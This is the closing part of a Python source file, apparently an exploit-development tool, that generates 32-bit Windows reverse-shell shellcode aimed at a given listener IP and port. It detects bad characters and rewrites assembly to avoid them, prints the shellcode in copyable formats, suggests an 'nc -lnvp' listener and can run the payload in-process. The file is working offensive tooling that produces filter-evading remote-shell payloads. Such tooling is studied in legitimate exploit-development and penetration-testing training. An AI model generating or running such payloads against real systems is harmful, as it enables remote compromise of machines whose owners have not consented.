                        print(f"{Colors.GREEN}  ✓ Fixed: {instruction_key}{Colors.END}")
                        continue

        except Exception as e:
            # If disassembly fails, keep original
            pass

        # Keep original line if no fix needed
        fixed_lines.append(original_line)

    print(f"\n{Colors.GREEN}[+] Applied {fixes_applied} fix(es){Colors.END}")

    # Assemble the fixed code
    fixed_asm_code = '\n'.join(fixed_lines)

    # Clean up Capstone's size prefixes that Keystone doesn't like in some contexts
    # Keystone can infer sizes, so remove "dword ptr", "word ptr", "byte ptr"
    fixed_asm_code = re.sub(r'\b(dword|word|byte)\s+ptr\s+', '', fixed_asm_code)

    # Fix label formatting for Keystone - labels must be at start of line
    fixed_lines_clean = []

    for line in fixed_asm_code.split('\n'):
        stripped = line.strip()

        # Check if this line is a label (ends with : and has no other content before it)
        is_label = ':' in line and stripped.endswith(':') and not any(stripped.startswith(x) for x in [';', '//', '#'])

        if is_label:
            # Labels must be at start of line with no leading whitespace
            fixed_lines_clean.append(stripped)
        else:
            fixed_lines_clean.append(line)

    fixed_asm_code = '\n'.join(fixed_lines_clean)

    # Save fixed assembly to file for user inspection
    fixed_asm_file = '/tmp/fixed_shellcode_asm.txt'
    with open(fixed_asm_file, 'w') as f:
        f.write(fixed_asm_code)

    print(f"\n{Colors.GREEN}[+] Fixed assembly code saved to: {fixed_asm_file}{Colors.END}")
    print(f"{Colors.CYAN}[*] You can manually review and assemble this code if needed{Colors.END}")

    # Show a preview of the fixed instructions
    print(f"\n{Colors.YELLOW}Preview of applied fixes:{Colors.END}")
    preview_lines = []
    for line in fixed_lines:
        if '# Was:' in line or (line.strip() and not line.strip().endswith(':')):
            preview_lines.append(line)
            if len(preview_lines) >= 20:  # Show first 20 relevant lines
                break

    for line in preview_lines[:10]:
        print(f"  {line}")
    if len(preview_lines) > 10:
        print(f"  ... (see {fixed_asm_file} for full code)")

    print(f"\n{Colors.CYAN}[*] Assembling fixed code...{Colors.END}")

    try:
        analyzer = BadcharAnalyzer([])  # Empty badchars for assembly
        fixed_shellcode = analyzer.assemble(fixed_asm_code)

        if fixed_shellcode:
            print(f"{Colors.GREEN}[+] Fixed shellcode assembled: {len(fixed_shellcode)} bytes{Colors.END}")
            return fixed_shellcode
        else:
            print(f"{Colors.YELLOW}[!] Assembly of fixed code failed{Colors.END}")
            print(f"{Colors.CYAN}[*] This can happen due to Keystone quirks with label syntax{Colors.END}")
            print(f"{Colors.CYAN}[*] The fixed assembly is still available in: {fixed_asm_file}{Colors.END}")
            return None

    except Exception as e:
        print(f"{Colors.YELLOW}[!] Assembly error: {e}{Colors.END}")
        print(f"{Colors.CYAN}[*] The fixes have been applied and saved to: {fixed_asm_file}{Colors.END}")
        print(f"{Colors.CYAN}[*] You can manually assemble this code or use it as a reference{Colors.END}")
        return None


def print_shellcode_output(shellcode: bytes, bad_chars_detected: bool, bad_chars: Set[int]):
    """Print the shellcode in various formats with badchars highlighted"""
    print(f"{Colors.BOLD}{'='*100}{Colors.END}")
    print(f"{Colors.BOLD}SHELLCODE OUTPUT{Colors.END}")
    print(f"{Colors.BOLD}{'='*100}{Colors.END}\n")

    # Python format with colored badchars
    print(f"{Colors.CYAN}Python format:{Colors.END}")
    shellcode_str = 'shellcode = b"'
    for i, byte in enumerate(shellcode):
        if i > 0 and i % 16 == 0:
            shellcode_str += '"\nshellcode += b"'
        if byte in bad_chars:
            shellcode_str += f"{Colors.RED}\\x{byte:02x}{Colors.END}"
        else:
            shellcode_str += f"\\x{byte:02x}"
    shellcode_str += '"'
    print(shellcode_str)

    # C format with colored badchars
    print(f"\n{Colors.CYAN}C format:{Colors.END}")
    c_str = 'unsigned char shellcode[] = \n"'
    for i, byte in enumerate(shellcode):
        if i > 0 and i % 16 == 0:
            c_str += '"\n"'
        if byte in bad_chars:
            c_str += f"{Colors.RED}\\x{byte:02x}{Colors.END}"
        else:
            c_str += f"\\x{byte:02x}"
    c_str += '";'
    print(c_str)

    # Plain text format (for copying without color codes)
    print(f"\n{Colors.CYAN}Plain text (no colors, for copying):{Colors.END}")
    plain_str = 'shellcode = b"'
    for i, byte in enumerate(shellcode):
        if i > 0 and i % 16 == 0:
            plain_str += '"\nshellcode += b"'
        plain_str += f"\\x{byte:02x}"
    plain_str += '"'
    print(plain_str)

    # Statistics
    print(f"\n{Colors.YELLOW}Statistics:{Colors.END}")
    print(f"  Length: {len(shellcode)} bytes ({hex(len(shellcode))})")

    if bad_chars_detected:
        print(f"  Status: {Colors.RED}Contains bad characters{Colors.END}")
        # Count badchar occurrences
        badchar_counts = {}
        for byte in shellcode:
            if byte in bad_chars:
                badchar_counts[byte] = badchar_counts.get(byte, 0) + 1

        print(f"  {Colors.YELLOW}Badchar occurrences:{Colors.END}")
        for bc, count in sorted(badchar_counts.items()):
            print(f"    {Colors.RED}\\x{bc:02x}{Colors.END}: {count} time(s)")
    else:
        print(f"  Status: {Colors.GREEN}Clean (no bad characters){Colors.END}")


def main():
    parser = argparse.ArgumentParser(
        description='Advanced Shellcode Generator with Badchar Detection',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Generate reverse shell with default bad char (\\x00)
  %(prog)s -l 192.168.1.10 -p 4444

  # Specify multiple bad chars
  %(prog)s -l 192.168.1.10 -p 4444 -b 00 0a 0d 20

  # Show all instructions (not just bad ones)
  %(prog)s -l 192.168.1.10 -p 4444 -b 00 20 -a

  # Save to file
  %(prog)s -l 192.168.1.10 -p 4444 -o shellcode.bin
        """
    )

    parser.add_argument('-l', '--lhost', required=True,
                        help='Listener IP address (e.g., 192.168.1.10)')
    parser.add_argument('-p', '--lport', required=True, type=int,
                        help='Listener port (e.g., 4444)')
    parser.add_argument('-b', '--badchars', nargs='+', default=['00'],
                        help='Bad characters in hex. Formats: "00 0a 0d 20" or "\\x00\\x0a\\x0d\\x20". Default: 00')
    parser.add_argument('-a', '--show-all', action='store_true',
                        help='Show all instructions, not just those with bad chars')
    parser.add_argument('-A', '--auto-fix', action='store_true',
                        help='Automatically apply suggested alternatives and show resolved shellcode')
    parser.add_argument('-o', '--output', type=str,
                        help='Output file to save raw shellcode')
    parser.add_argument('-d', '--debug', action='store_true',
                        help='Insert int3 breakpoint at start for debugging with WinDbg/x64dbg')
    parser.add_argument('-t', '--test', action='store_true',
                        help='Execute shellcode in current process (Windows 32-bit only)')

    args = parser.parse_args()

    # Print header
    print(f"\n{Colors.BOLD}{Colors.CYAN}")
    print("Shellcode generator with badchar detection and auto-fix")
    print(f"{Colors.END}\n")

    # Parse badchars first to display them correctly
    bad_chars_set = BadcharAnalyzer.parse_badchars(args.badchars)

    print(f"{Colors.YELLOW}Configuration:{Colors.END}")
    print(f"  LHOST: {args.lhost}")
    print(f"  LPORT: {args.lport}")
    print(f"  Bad chars: {' '.join([f'\\x{bc:02x}' for bc in sorted(bad_chars_set)])}")
    if args.debug:
        print(f"  Debug mode: {Colors.GREEN}Enabled (int3 breakpoint inserted){Colors.END}")
    if args.test:
        print(f"  Test mode: {Colors.YELLOW}Shellcode will be executed{Colors.END}")

    # Generate shellcode
    print(f"\n{Colors.CYAN}[*] Generating reverse shell assembly code...{Colors.END}")
    generator = ShellcodeGenerator(args.lhost, args.lport)
    asm_code = generator.generate_asm(debug=args.debug)

    # Create analyzer
    analyzer = BadcharAnalyzer(args.badchars)

    # Print assembly code with hex bytes
    print(f"\n{Colors.BOLD}{'='*100}{Colors.END}")
    print(f"{Colors.BOLD}ASSEMBLY CODE WITH HEX BYTES{Colors.END}")
    print(f"{Colors.BOLD}{'='*100}{Colors.END}\n")

    # Assemble each line individually to show hex bytes
    print_assembly_with_hex(asm_code, analyzer.bad_chars)

    # Assemble full shellcode
    print(f"\n{Colors.CYAN}[*] Assembling complete shellcode with keystone-engine...{Colors.END}")
    shellcode = analyzer.assemble(asm_code)

    if not shellcode:
        print(f"{Colors.RED}[!] Failed to assemble shellcode{Colors.END}")
        return 1

    print(f"{Colors.GREEN}[+] Shellcode assembled successfully ({len(shellcode)} bytes){Colors.END}")

    # Analyze for bad chars
    print(f"{Colors.CYAN}[*] Analyzing for bad characters...{Colors.END}")
    has_badchars, results = analyzer.analyze(shellcode)

    # Print analysis
    analyzer.print_analysis(results, show_all=args.show_all)

    # Print shellcode output
    print_shellcode_output(shellcode, has_badchars, analyzer.bad_chars)

    # Initialize fixed_shellcode as None (will be set if auto-fix succeeds)
    fixed_shellcode = None

    # Auto-fix feature: Apply suggested alternatives
    if args.auto_fix and has_badchars:
        print(f"\n{Colors.BOLD}{Colors.CYAN}{'='*100}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}AUTO-FIX: APPLYING SUGGESTED ALTERNATIVES{Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}{'='*100}{Colors.END}\n")

        fixed_shellcode = apply_auto_fix(asm_code, results, analyzer.bad_chars, args)

        if fixed_shellcode:
            print(f"\n{Colors.GREEN}{Colors.BOLD}[+] Auto-fix completed successfully!{Colors.END}")

            # Analyze the fixed shellcode
            has_badchars_fixed, results_fixed = analyzer.analyze(fixed_shellcode)

            print(f"\n{Colors.BOLD}{'='*100}{Colors.END}")
            print(f"{Colors.BOLD}FIXED SHELLCODE ANALYSIS{Colors.END}")
            print(f"{Colors.BOLD}{'='*100}{Colors.END}\n")

            analyzer.print_analysis(results_fixed, show_all=False)

            # Print fixed shellcode output
            print(f"\n{Colors.BOLD}{'='*100}{Colors.END}")
            print(f"{Colors.BOLD}FIXED SHELLCODE OUTPUT{Colors.END}")
            print(f"{Colors.BOLD}{'='*100}{Colors.END}\n")
            print_shellcode_output(fixed_shellcode, has_badchars_fixed, analyzer.bad_chars)

            # Compare sizes
            print(f"\n{Colors.YELLOW}Size comparison:{Colors.END}")
            print(f"  Original: {len(shellcode)} bytes")
            print(f"  Fixed:    {len(fixed_shellcode)} bytes")
            print(f"  Difference: {len(fixed_shellcode) - len(shellcode):+d} bytes")

            if has_badchars_fixed:
                print(f"\n{Colors.RED}[!] WARNING: Fixed shellcode still contains bad characters!{Colors.END}")
                print(f"{Colors.YELLOW}[*] Some instructions could not be automatically fixed.{Colors.END}")
                print(f"{Colors.YELLOW}[*] Manual fixes may be required.{Colors.END}")
            else:
                print(f"\n{Colors.GREEN}{Colors.BOLD}✓ Fixed shellcode is clean! All badchars resolved!{Colors.END}")
        else:
            print(f"\n{Colors.YELLOW}[*] Auto-fix applied suggested alternatives to assembly code{Colors.END}")
            print(f"{Colors.CYAN}[*] Review the fixed assembly file and manually assemble if needed{Colors.END}")

    # Save to file if requested
    if args.output:
        # Use fixed shellcode if available, otherwise use original
        shellcode_to_save = fixed_shellcode if fixed_shellcode else shellcode
        with open(args.output, 'wb') as f:
            f.write(shellcode_to_save)

        if fixed_shellcode:
            print(f"\n{Colors.GREEN}[+] Fixed shellcode saved to: {args.output}{Colors.END}")
            # Also save original for comparison
            original_output = args.output + '.original'
            with open(original_output, 'wb') as f:
                f.write(shellcode)
            print(f"{Colors.YELLOW}[+] Original shellcode saved to: {original_output}{Colors.END}")
        else:
            print(f"\n{Colors.GREEN}[+] Shellcode saved to: {args.output}{Colors.END}")

    # Print listener command
    if not args.test:
        print(f"\n{Colors.YELLOW}Start listener with:{Colors.END}")
        print(f"  nc -lnvp {args.lport}")

    # Execute shellcode if requested
    if args.test:
        print(f"\n{Colors.BOLD}{Colors.YELLOW}{'='*100}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.YELLOW}SHELLCODE EXECUTION{Colors.END}")
        print(f"{Colors.BOLD}{Colors.YELLOW}{'='*100}{Colors.END}")

        # Use fixed shellcode if available, otherwise use original
        shellcode_to_execute = fixed_shellcode if fixed_shellcode else shellcode

        if fixed_shellcode:
            print(f"{Colors.GREEN}[*] Using auto-fixed shellcode for execution{Colors.END}")
            # Re-analyze to check if fixed shellcode has badchars
            has_badchars_exec, _ = analyzer.analyze(shellcode_to_execute)
        else:
            has_badchars_exec = has_badchars

        if has_badchars_exec:
            print(f"{Colors.RED}[!] WARNING: Shellcode contains bad characters!{Colors.END}")
            response = input(f"{Colors.YELLOW}Continue anyway? (y/N): {Colors.END}")
            if response.lower() != 'y':
                print(f"{Colors.CYAN}[*] Execution cancelled{Colors.END}")
                return 1

        execute_shellcode(shellcode_to_execute)

    return 0 if not has_badchars else 1


if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Interrupted by user{Colors.END}")
        sys.exit(1)

